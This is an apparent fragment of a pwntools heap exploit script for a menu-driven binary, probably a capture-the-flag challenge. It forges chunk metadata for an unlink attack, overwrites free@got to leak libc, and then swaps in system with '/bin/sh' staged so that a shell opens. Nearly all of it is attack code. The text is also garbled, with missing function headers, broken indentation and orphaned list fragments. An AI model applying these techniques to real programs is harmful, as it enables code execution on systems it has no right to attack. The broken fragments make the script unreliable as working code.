    sla("Exit\n", "1")
    sla("add?\n", str(t))
    if add_lf:
        sla("Content:\n", data)
    else:
        sa("Content:\n", data)


def delete(t):
    sla("Exit\n", "2")
    sla("delete?\n", str(t))


def update(t, data="deadbeef", add_lf=True):
    sla("Exit\n", "3")
    sla("update?\n", str(t))
    if add_lf:
        sla("Content:\n", data)
    else:
        sa("Content:\n", data)

    0xb0:[
        0, 0x21, 0, 0
    ] * 3
}))

# make an unsortedbin chunk

    delete(large)

# overlap
add(small)
add(small)

# overwrite

    0, 0x21,
    0x6020d8-0x18, 0x6020d8-0x10,
    0x20, 0x90
]))

# unlink
for i in range(8):
    delete(small)

update(large, flat([
    "/bin/sh\x00", 0, 
    elf.got.free, elf.got.setvbuf
]))

# write free@got
update(small, p64(elf.plt.puts))

# leak libc addr
delete(large)

update(small, p64(libc.sym.system))
